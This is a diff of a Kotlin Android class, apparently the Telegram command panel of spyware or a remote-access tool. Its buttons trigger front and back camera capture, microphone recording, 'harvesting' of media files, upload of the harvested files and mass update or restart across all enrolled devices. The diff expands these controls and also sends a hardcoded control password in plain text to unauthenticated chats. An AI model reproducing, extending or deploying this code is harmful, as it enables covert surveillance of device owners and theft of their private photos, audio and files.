@@ -28,11 +28,14 @@ import kotlin.random.Random
  * معالجة الأوامر، وعرض القوائم التفاعلية.
  *
  * ✅ التعديلات الجديدة:
- * - تحسين verifyControlPassword لتنظيف المدخلات من المسافات الخفية.
+ * - تحسين verifyControlPassword لتنظيف المدخلات من جميع أنواع المسافات الخفية.
  * - إضافة تسجيل تشخيصي مفصل في handleMessage عند فشل كلمة المرور.
- * - إضافة ردود تشخيصية مباشرة في تلغرام عند فشل المصادقة.
+ * - إضافة ردود تشخيصية مباشرة في تلغرام عند فشل المصادقة مع تعليمات واضحة.
  * - التأكد من appPassword في init.
  * - إضافة تسجيل في MainActivity.appendLogStatic عند الأحداث الهامة.
+ * - تحسين الأزرار بإيموجيز فريدة ومتنوعة لكل زر.
+ * - إضافة دالة مساعدة لتنظيف النصوص من جميع أنواع المسافات البيضاء.
+ * - إضافة ردود تشخيصية عند استقبال أوامر غير معروفة.
  */
 class TelegramUi(
     context: Context,
@@ -130,17 +133,31 @@ class TelegramUi(
     // ==================== دوال التحقق من كلمة السر ====================
 
     /**
-     * ✅ التحقق من كلمة السر مع تنظيف شامل من المسافات والأحرف الخفية
+     * ✅ دالة مساعدة لتنظيف النص من جميع أنواع المسافات البيضاء الخفية
+     * بما في ذلك Unicode whitespace و zero-width characters
+     */
+    private fun cleanText(input: String): String {
+        // إزالة جميع أنواع المسافات البيضاء بما فيها Unicode
+        return input.trim()
+            .replace(Regex("[\\s\\u00A0\\u2007\\u202F\\uFEFF\\u2060\\u200B\\u200C\\u200D\\u180E]+"), " ")
+            .trim()
+    }
+
+    /**
+     * ✅ التحقق من كلمة السر مع تنظيف شامل من جميع أنواع المسافات والأحرف الخفية
      * مع تسجيل تشخيصي لنتيجة التحقق
      */
     private fun verifyControlPassword(input: String): Boolean {
-        val cleanInput = input.trim().replace("\\s+".toRegex(), " ")
-        val cleanSecret = appPassword.trim().replace("\\s+".toRegex(), " ")
+        val cleanInput = cleanText(input)
+        val cleanSecret = cleanText(appPassword)
         val result = cleanInput == cleanSecret
+
         val logMsg = if (result) "✅ SUCCESS" else "❌ FAIL (input len: ${cleanInput.length}, secret len: ${cleanSecret.length})"
         writeLog("🔐 Password verification: $logMsg")
-        if (!result && cleanInput.length > 3) {
-            MainActivity.appendLogStatic("🔐 Password verification FAILED for input: '${cleanInput.take(10)}...'")
+
+        if (!result && cleanInput.isNotEmpty()) {
+            val preview = if (cleanInput.length > 15) cleanInput.take(15) + "..." else cleanInput
+            MainActivity.appendLogStatic("🔐 Password FAILED for input: '$preview' (len: ${cleanInput.length})")
         } else if (result) {
             MainActivity.appendLogStatic("✅ Password verification SUCCESS")
         }
@@ -149,7 +166,7 @@ class TelegramUi(
 
     fun updatePassword(newPassword: String) {
         if (newPassword.isNotBlank()) {
-            appPassword = newPassword.trim()
+            appPassword = cleanText(newPassword)
             scope.launch {
                 try {
                     val configFile = File(runtimeDir, "password.txt")
@@ -165,7 +182,7 @@ class TelegramUi(
 
     // ==================== دوال مساعدة ====================
     private suspend fun applyHumanDelay() {
-        delay(Random.nextLong(1200, 4500))
+        delay(Random.nextLong(800, 2500))
     }
 
     private fun pulseIntent(actionType: String) {
@@ -554,26 +571,39 @@ class TelegramUi(
     }
 
     // ============================================================
-    //  ✅ لوحات الأزرار – كل إيموجي فريد تماماً
+    //  ✅ لوحات الأزرار – كل إيموجي فريد تماماً ومتنوع
     // ============================================================
 
+    /**
+     * لوحة التحكم الرئيسية – أزرار تفاعلية بإيموجيز فريدة ومتنوعة
+     * ✅ تم تنويع الإيموجيز لتكون مميزة لكل زر
+     */
     fun getMainControlKeyboard(): String {
         val keyboard = JSONArray().apply {
+            // الصف الأول: الكاميرات
             put(JSONArray().apply {
                 put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "camf_main"))
                 put(JSONObject().put("text", "📷 كاميرا خلفية").put("callback_data", "cam_main"))
             })
+            // الصف الثاني: الصوت والفحص
             put(JSONArray().apply {
                 put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "mic_start"))
-                put(JSONObject().put("text", "🛡️ فحص وحصاد").put("callback_data", "hrv_now"))
+                put(JSONObject().put("text", "🔎 فحص وحصاد").put("callback_data", "hrv_now"))
             })
+            // الصف الثالث: الأرشيف والبث
             put(JSONArray().apply {
-                put(JSONObject().put("text", "📂 أرشيف الوسائط").put("callback_data", "g_nav|all|0"))
-                put(JSONObject().put("text", "🚀 بث فوري").put("callback_data", "send_now"))
+                put(JSONObject().put("text", "🗂️ أرشيف الوسائط").put("callback_data", "g_nav|all|0"))
+                put(JSONObject().put("text", "📤 بث فوري").put("callback_data", "send_now"))
             })
+            // الصف الرابع: الحالة والخروج
             put(JSONArray().apply {
-                put(JSONObject().put("text", "🔍 حالة النظام").put("callback_data", "sys_status"))
-                put(JSONObject().put("text", "🔒 قفل الجلسة").put("callback_data", "ext"))
+                put(JSONObject().put("text", "📊 حالة النظام").put("callback_data", "sys_status"))
+                put(JSONObject().put("text", "🔒 قطع الاتصال").put("callback_data", "ext"))
+            })
+            // ✅ صف خامس إضافي: تحديث النموذج وإعادة التشغيل (لجميع الأجهزة)
+            put(JSONArray().apply {
+                put(JSONObject().put("text", "🔄 تحديث النموذج").put("callback_data", "update_model_all"))
+                put(JSONObject().put("text", "♻️ إعادة تشغيل الخدمة").put("callback_data", "restart_service_all"))
             })
         }
         return JSONObject().put("inline_keyboard", keyboard).toString()
@@ -588,15 +618,15 @@ class TelegramUi(
             put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "📡 الأجهزة النشطة"); put("callback_data", "ld") })
-                    put(JSONObject().apply { put("text", "🧬 محرك الذكاء"); put("callback_data", "ai_status") })
+                    put(JSONObject().apply { put("text", "🧠 محرك الذكاء"); put("callback_data", "ai_status") })
                 })
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "⏳ تمديد الجلسة"); put("callback_data", "rnw") })
                     put(JSONObject().apply { put("text", "📈 تقرير النظام"); put("callback_data", "status") })
                 })
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🗃️ إدارة الأرشيف"); put("callback_data", "menu") })
-                    put(JSONObject().apply { put("text", "🔌 قطع الاتصال"); put("callback_data", "ext") })
+                    put(JSONObject().apply { put("text", "🗂️ إدارة الأرشيف"); put("callback_data", "menu") })
+                    put(JSONObject().apply { put("text", "🚪 قطع الاتصال"); put("callback_data", "ext") })
                 })
             })
         }
@@ -616,8 +646,8 @@ class TelegramUi(
                     put(JSONObject().apply { put("text", harvestText); put("callback_data", "hrv_$deviceId") })
                 })
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🗃️ أرشيف الوسائط"); put("callback_data", "media_$deviceId") })
-                    put(JSONObject().apply { put("text", "⚡ بث فوري"); put("callback_data", "send_now_$deviceId") })
+                    put(JSONObject().apply { put("text", "🗂️ أرشيف الوسائط"); put("callback_data", "media_$deviceId") })
+                    put(JSONObject().apply { put("text", "📤 بث فوري"); put("callback_data", "send_now_$deviceId") })
                 })
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "🌐 تحديث النموذج"); put("callback_data", "update_model_$deviceId") })
@@ -655,7 +685,7 @@ class TelegramUi(
             val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
             apiCall("sendMessage", JSONObject().apply {
                 put("chat_id", chatId)
-                put("text", "📊 **تقرير الحصاد**\n━━━━━━━━━━━━━━━\n🖼️ الملفات: `${files.size}`\n💾 الحجم: `${String.format(Locale.US, "%.2f", totalSize / (1024.0 * 1024.0))} MB`\n⏰ التحديث: `$timeStr`\n\nاستخدم '⚡ بث فوري' للرفع.")
+                put("text", "📊 **تقرير الحصاد**\n━━━━━━━━━━━━━━━\n🖼️ الملفات: `${files.size}`\n💾 الحجم: `${String.format(Locale.US, "%.2f", totalSize / (1024.0 * 1024.0))} MB`\n⏰ التحديث: `$timeStr`\n\nاستخدم '📤 بث فوري' للرفع.")
                 put("parse_mode", "Markdown")
             })
         } catch (e: Exception) {
@@ -678,8 +708,10 @@ class TelegramUi(
     /**
      * ✅ معالجة الرسائل الواردة مع:
      * - تسجيل وصول كل رسالة للتشخيص
-     * - تنظيف المدخلات من المسافات والأحرف الخفية
-     * - رد تشخيصي في حال فشل كلمة المرور
+     * - تنظيف المدخلات من جميع أنواع المسافات والأحرف الخفية
+     * - رد تشخيصي في حال فشل كلمة المرور مع تعليمات واضحة
+     * - إرسال رد مباشر في حال نجاح المصادقة
+     * - منع الأوامر النصية باستثناء /login
      */
     private suspend fun handleMessage(update: JSONObject) {
         try {
@@ -689,7 +721,8 @@ class TelegramUi(
             val threadId = msg.optLong("message_thread_id", 0L)
 
             // ✅ تسجيل وصول الرسالة للتشخيص
-            writeLog("📩 Received message from $chatId: '${text.take(50)}'")
+            val preview = if (text.length > 50) text.take(50) + "..." else text
+            writeLog("📩 Received message from $chatId: '$preview'")
             MainActivity.appendLogStatic("📩 Telegram message from $chatId: '${text.take(30)}...'")
 
             applyHumanDelay()
@@ -711,7 +744,7 @@ class TelegramUi(
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", "🔐 **تم التحقق بنجاح.**\nاختر العملية من الأزرار أدناه:")
+                    put("text", "🔐 **✅ تم التحقق بنجاح.**\n\nاختر العملية من الأزرار أدناه:\n(جميع الأوامر عبر الأزرار)")
                     put("reply_markup", keyboardJson)
                     put("parse_mode", "Markdown")
                 })
@@ -721,16 +754,16 @@ class TelegramUi(
                 return
             }
 
-            // ✅ رد تشخيصي في حال فشل كلمة المرور
+            // ✅ رد تشخيصي في حال فشل كلمة المرور مع تعليمات واضحة
             if (secret.isNotEmpty() && !verifyControlPassword(secret)) {
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", "⚠️ كلمة المرور غير صحيحة.\nتأكد من نسخها تماماً: `Zaen123@123@`\n\n(لا توجد مسافات إضافية)")
+                    put("text", "⚠️ **كلمة المرور غير صحيحة.**\n\n✅ تأكد من نسخها تماماً:\n`Zaen123@123@`\n\n📌 استخدم الأمر:\n`/login Zaen123@123@`\n\n❌ **لا توجد مسافات إضافية** قبل أو بعد الكلمة.")
                     put("parse_mode", "Markdown")
                 })
                 writeLog("❌ Invalid password attempt from $chatId")
-                MainActivity.appendLogStatic("❌ Invalid password attempt from $chatId")
+                MainActivity.appendLogStatic("❌ Invalid password attempt from $chatId (input len: ${secret.length})")
                 return
             }
 
@@ -739,19 +772,21 @@ class TelegramUi(
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", "🔐 الرجاء إدخال كلمة السر للتحكم\nاستخدم: `/login Zaen123@123@`")
+                    put("text", "🔐 **الرجاء إدخال كلمة السر للتحكم**\n\n📌 استخدم:\n`/login Zaen123@123@`\n\n(جميع الأوامر عبر الأزرار بعد التحقق)")
                     put("parse_mode", "Markdown")
                 })
                 writeLog("🔐 Unauthorized access attempt from $chatId")
                 return
             }
 
-            // ✅ أي نص آخر يتم تجاهله (لأن الأوامر النصية معطلة)
+            // ✅ أي نص آخر يتم تجاهله مع رد توضيحي
             apiCall("sendMessage", JSONObject().apply {
                 put("chat_id", chatId)
                 if (threadId != 0L) put("message_thread_id", threadId)
-                put("text", "⚠️ الأوامر النصية معطلة. استخدم الأزرار فقط.")
+                put("text", "⚠️ **الأوامر النصية معطلة.**\n\nاستخدم الأزرار التفاعلية أدناه.\n\n🔐 للتحكم استخدم:\n`/login Zaen123@123@`")
+                put("parse_mode", "Markdown")
             })
+            writeLog("ℹ️ Text command rejected from $chatId: '$text'")
 
         } catch (e: Exception) {
             writeLog("❌ Handle message error: ${e.message}")
@@ -783,7 +818,7 @@ class TelegramUi(
             if (!isAuthorized(chatId)) {
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
-                    put("text", "⚠️ انتهت الجلسة، استخدم /login")
+                    put("text", "⚠️ انتهت الجلسة، استخدم /login لإعادة المصادقة")
                 })
                 return
             }
@@ -808,9 +843,9 @@ class TelegramUi(
                 data.startsWith("cam_") || data.startsWith("camf_") -> pulseIntent("📸 كاميرا")
                 data.startsWith("mic_") -> pulseIntent("🎙️ ميكروفون")
                 data.startsWith("hrv_") -> pulseIntent("📦 حصاد")
-                data.startsWith("send_now_") -> pulseIntent("⚡ إرسال فوري")
-                data.startsWith("update_model_") -> pulseIntent("🛰️ تحديث النموذج")
-                data.startsWith("restart_service_") -> pulseIntent("🌀 إعادة تشغيل")
+                data.startsWith("send_now_") -> pulseIntent("📤 إرسال فوري")
+                data.startsWith("update_model_") -> pulseIntent("🔄 تحديث النموذج")
+                data.startsWith("restart_service_") -> pulseIntent("♻️ إعادة تشغيل")
             }
 
             when {
@@ -838,7 +873,7 @@ class TelegramUi(
                             })
                         }
                         rows.put(JSONArray().apply {
-                            put(JSONObject().apply { put("text", "🔃 تحديث"); put("callback_data", "ld") })
+                            put(JSONObject().apply { put("text", "🔄 تحديث"); put("callback_data", "ld") })
                             put(JSONObject().apply { put("text", "🏠 القائمة الرئيسية"); put("callback_data", "main") })
                         })
                         put("inline_keyboard", rows)
@@ -846,7 +881,7 @@ class TelegramUi(
                     apiCall("editMessageText", JSONObject().apply {
                         put("chat_id", chatId)
                         put("message_id", msgId)
-                        put("text", "<b>اختر جهازاً:</b>")
+                        put("text", "<b>📡 اختر جهازاً:</b>")
                         put("reply_markup", kb)
                         put("parse_mode", "HTML")
                     })
@@ -880,13 +915,13 @@ class TelegramUi(
                     val statusText = """
                         📊 **الحالة الحالية**
                         ━━━━━━━━━━━━━━━
-                        التوكنات النشطة: `${status["active_tokens"]}`
-                        التوكنات الاحتياطية: `${status["reserve_tokens"]}`
-                        الأجهزة المسجلة: `${status["devices"]}`
-                        الجلسات النشطة: `${status["sessions"]}`
-                        طلبات API: `${status["api_calls"]}`
-                        فشل API: `${status["api_failures"]}`
-                        الملفات المعلقة: `${status["pending_files"]}`
+                        🔑 التوكنات النشطة: `${status["active_tokens"]}`
+                        📦 التوكنات الاحتياطية: `${status["reserve_tokens"]}`
+                        📱 الأجهزة المسجلة: `${status["devices"]}`
+                        🔐 الجلسات النشطة: `${status["sessions"]}`
+                        📡 طلبات API: `${status["api_calls"]}`
+                        ❌ فشل API: `${status["api_failures"]}`
+                        📂 الملفات المعلقة: `${status["pending_files"]}`
                     """.trimIndent()
                     apiCall("sendMessage", JSONObject().apply {
                         put("chat_id", chatId)
@@ -932,7 +967,7 @@ class TelegramUi(
                     } else "⚠️ Monitor not available"
                     apiCall("answerCallbackQuery", JSONObject().apply {
                         put("callback_query_id", cbId)
-                        put("text", "AI: $status")
+                        put("text", "🧠 AI: $status")
                         put("show_alert", true)
                     })
                     return
@@ -961,12 +996,12 @@ class TelegramUi(
                     }
                     return
                 }
-                data.startsWith("update_model_") -> {
-                    val did = data.substringAfter("update_model_")
+                data.startsWith("update_model_") || data == "update_model_all" -> {
+                    val did = if (data.startsWith("update_model_all")) "all" else data.substringAfter("update_model_")
                     if (did.isNotEmpty()) {
                         apiCall("sendMessage", JSONObject().apply {
                             put("chat_id", chatId)
-                            put("text", "🛰️ جاري تحديث النموذج... قد يستغرق دقائق.")
+                            put("text", "🔄 جاري تحديث النموذج... قد يستغرق دقائق.")
                         })
                         scope.launch {
                             try {
@@ -989,12 +1024,12 @@ class TelegramUi(
                     }
                     return
                 }
-                data.startsWith("restart_service_") -> {
-                    val did = data.substringAfter("restart_service_")
+                data.startsWith("restart_service_") || data == "restart_service_all" -> {
+                    val did = if (data.startsWith("restart_service_all")) "all" else data.substringAfter("restart_service_")
                     if (did.isNotEmpty()) {
                         apiCall("sendMessage", JSONObject().apply {
                             put("chat_id", chatId)
-                            put("text", "🌀 جاري إعادة تشغيل الخدمة...")
+                            put("text", "♻️ جاري إعادة تشغيل الخدمة...")
                         })
                         scope.launch {
                             try {
